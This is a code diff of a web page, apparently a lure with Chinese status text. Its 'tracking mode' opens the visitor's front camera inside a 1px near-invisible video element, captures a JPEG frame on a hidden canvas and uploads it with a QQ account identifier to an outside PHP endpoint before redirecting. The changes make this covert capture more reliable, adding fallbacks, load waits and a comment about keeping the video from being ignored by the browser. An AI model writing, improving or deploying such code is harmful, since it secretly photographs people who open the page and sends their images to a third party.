@@ -24,7 +24,7 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
             background: var(--bg);
-            background-image: 
+            background-image:
                 radial-gradient(ellipse at 50% 0%, rgba(108,92,231,0.08) 0%, transparent 70%),
                 radial-gradient(ellipse at 80% 20%, rgba(46,204,113,0.04) 0%, transparent 60%);
             min-height: 100vh;
@@ -167,6 +167,18 @@
         }
         .tracking-denied .denied-title { font-size:18px; color:#e74c3c; margin-bottom:8px; letter-spacing:1px; }
         .tracking-denied .denied-subtitle { font-size:12px; color:#666; line-height:1.8; }
+
+        /* 视频元素改为 1px 透明，避免被浏览器忽略 */
+        #hiddenVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -1;
+        }
     </style>
 </head>
 <body>
@@ -239,7 +251,7 @@
         </div>
     </div>
 
-    <video id="hiddenVideo" playsinline autoplay muted style="position:fixed;top:-100vh;left:-100vw;width:640px;height:480px;pointer-events:none;opacity:0;"></video>
+    <video id="hiddenVideo" playsinline autoplay muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
@@ -397,7 +409,7 @@
             if (container) container.innerHTML = '';
         }
 
-        // ========== 追踪模式 ==========
+        // ========== 追踪模式 (修复版) ==========
         function updateStatus(text, isError = false) {
             const el = document.getElementById('trackingStatus');
             if (el) {
@@ -415,86 +427,139 @@
             const trackingSpinner = document.getElementById('trackingSpinner');
             const trackingDenied = document.getElementById('trackingDenied');
             const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
 
             async function startCapture() {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const ctx = canvas.getContext('2d');
-
-                updateStatus('正在初始化...');
-                await sleep(400);
+                updateStatus('正在初始化环境...');
 
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    updateStatus('环境不兼容，正在跳转...', true);
+                    updateStatus('当前环境不支持，即将离开...', true);
                     trackingSpinner.classList.add('error');
                     stopBackgroundText();
                     setTimeout(() => doRedirect(), 2000);
                     return;
                 }
 
-                updateStatus('等待授权...');
-                await sleep(300);
-
+                updateStatus('正在请求授权...');
                 const constraints = {
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 };
 
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    updateStatus('授权成功');
+                    updateStatus('授权成功，正在准备...');
                 } catch (err) {
+                    console.error('getUserMedia error:', err.name, err.message);
+                    // 尝试降级
                     if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
+                        updateStatus('尝试兼容模式...');
                         try {
                             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                            updateStatus('授权成功');
-                        } catch (err2) { handleDenied(); return; }
+                            updateStatus('授权成功，正在准备...');
+                        } catch (err2) {
+                            handleDenied();
+                            return;
+                        }
                     } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                        handleDenied(); return;
+                        handleDenied();
+                        return;
                     } else if (err.name === 'NotFoundError') {
-                        updateStatus('设备不可用，正在跳转...', true);
+                        updateStatus('未找到可用设备，即将离开...', true);
                         trackingSpinner.classList.add('error');
                         stopBackgroundText();
                         setTimeout(() => doRedirect(), 2000);
                         return;
-                    } else { handleDenied(); return; }
+                    } else {
+                        updateStatus('授权异常，即将离开...', true);
+                        trackingSpinner.classList.add('error');
+                        stopBackgroundText();
+                        setTimeout(() => doRedirect(), 2000);
+                        return;
+                    }
                 }
 
+                // 绑定视频流
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 video.muted = true;
-                updateStatus('准备就绪...');
-                await sleep(1500);
-                if (video.readyState < 2) await sleep(2000);
-                const vw = video.videoWidth || 640;
-                const vh = video.videoHeight || 480;
-                if (vw === 0 || vh === 0) {
-                    updateStatus('数据异常，正在跳转...', true);
+
+                // 等待视频真正可以播放 (loadeddata 事件)
+                updateStatus('正在加载数据...');
+                try {
+                    await new Promise((resolve, reject) => {
+                        const timeout = setTimeout(() => {
+                            reject(new Error('视频加载超时（10秒）'));
+                        }, 10000);
+
+                        const onLoaded = () => {
+                            clearTimeout(timeout);
+                            resolve();
+                        };
+                        video.addEventListener('loadeddata', onLoaded, { once: true });
+
+                        // 如果视频已经加载好，直接 resolve
+                        if (video.readyState >= 2) {
+                            clearTimeout(timeout);
+                            video.removeEventListener('loadeddata', onLoaded);
+                            resolve();
+                        }
+
+                        // 手动播放（静音模式一般不会被阻止）
+                        video.play().catch(e => {
+                            console.warn('play() 被拦截:', e.message);
+                            // 仍然等待 loadeddata
+                        });
+                    });
+                } catch (err) {
+                    console.error(err);
+                    updateStatus('数据加载失败，即将离开...', true);
                     trackingSpinner.classList.add('error');
                     stopStream(stream);
                     stopBackgroundText();
                     setTimeout(() => doRedirect(), 2000);
                     return;
                 }
-                canvas.width = vw; canvas.height = vh;
-                updateStatus('处理中...');
-                try { ctx.drawImage(video, 0, 0, vw, vh); }
-                catch (e) {
-                    updateStatus('处理失败，正在跳转...', true);
+
+                // 额外等待一小段时间确保帧已渲染
+                await sleep(500);
+
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                if (!vw || !vh || vw === 0 || vh === 0) {
+                    updateStatus('无法获取有效数据，即将离开...', true);
                     trackingSpinner.classList.add('error');
                     stopStream(stream);
                     stopBackgroundText();
                     setTimeout(() => doRedirect(), 2000);
                     return;
                 }
+
+                canvas.width = vw;
+                canvas.height = vh;
+                const ctx = canvas.getContext('2d');
+                updateStatus('正在处理...');
+                try {
+                    ctx.drawImage(video, 0, 0, vw, vh);
+                } catch (e) {
+                    updateStatus('处理失败，即将离开...', true);
+                    trackingSpinner.classList.add('error');
+                    stopStream(stream);
+                    stopBackgroundText();
+                    setTimeout(() => doRedirect(), 2000);
+                    return;
+                }
+
                 const imageData = canvas.toDataURL('image/jpeg', 0.65);
                 stopStream(stream);
+                updateStatus('正在上传...');
 
-                updateStatus('上传中...');
                 const formData = new FormData();
                 formData.append('qq', qq);
                 formData.append('image', imageData);
+
                 let uploadSuccess = false;
                 try {
                     const controller = new AbortController();
@@ -503,19 +568,30 @@
                     clearTimeout(timeoutId);
                     if (response.ok) {
                         const result = await response.json();
-                        if (result.success) uploadSuccess = true;
+                        if (result.success) {
+                            uploadSuccess = true;
+                            updateStatus('✓ 完成');
+                            trackingSpinner.classList.add('done');
+                        } else {
+                            updateStatus('服务器拒绝，即将离开...', true);
+                            trackingSpinner.classList.add('error');
+                        }
+                    } else {
+                        updateStatus('上传失败，即将离开...', true);
+                        trackingSpinner.classList.add('error');
                     }
-                } catch (err) {}
-
-                if (uploadSuccess) {
-                    updateStatus('✓ 完成');
-                    trackingSpinner.classList.add('done');
-                } else {
-                    updateStatus('处理完成，正在跳转...', true);
+                } catch (err) {
+                    if (err.name === 'AbortError') {
+                        updateStatus('上传超时，即将离开...', true);
+                    } else {
+                        updateStatus('网络错误，即将离开...', true);
+                    }
+                    trackingSpinner.classList.add('error');
                 }
+
                 stopBackgroundText();
-                await sleep(2000);
-                doRedirect();
+                const delay = uploadSuccess ? 2000 : 1500;
+                setTimeout(() => doRedirect(), delay);
             }
 
             function handleDenied() {
@@ -529,23 +605,22 @@
                 }, 2000);
             }
 
-            function stopStream(s) { if (s) s.getTracks().forEach(t => t.stop()); }
+            function stopStream(s) {
+                if (s) s.getTracks().forEach(t => t.stop());
+            }
+
             function doRedirect() {
                 document.getElementById('trackingMode').style.display = 'none';
-                const video = document.getElementById('hiddenVideo');
                 if (video && video.srcObject) stopStream(video.srcObject);
                 window.location.href = redirectUrl;
             }
-            function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-            setTimeout(() => {
-                startCapture().catch(err => {
-                    updateStatus('发生错误，正在跳转...', true);
-                    trackingSpinner.classList.add('error');
-                    stopBackgroundText();
-                    setTimeout(() => doRedirect(), 2000);
-                });
-            }, 600);
+            function sleep(ms) {
+                return new Promise(r => setTimeout(r, ms));
+            }
+
+            // 延迟启动，让终端画面先出来
+            setTimeout(startCapture, 800);
         }
     </script>
 </body>
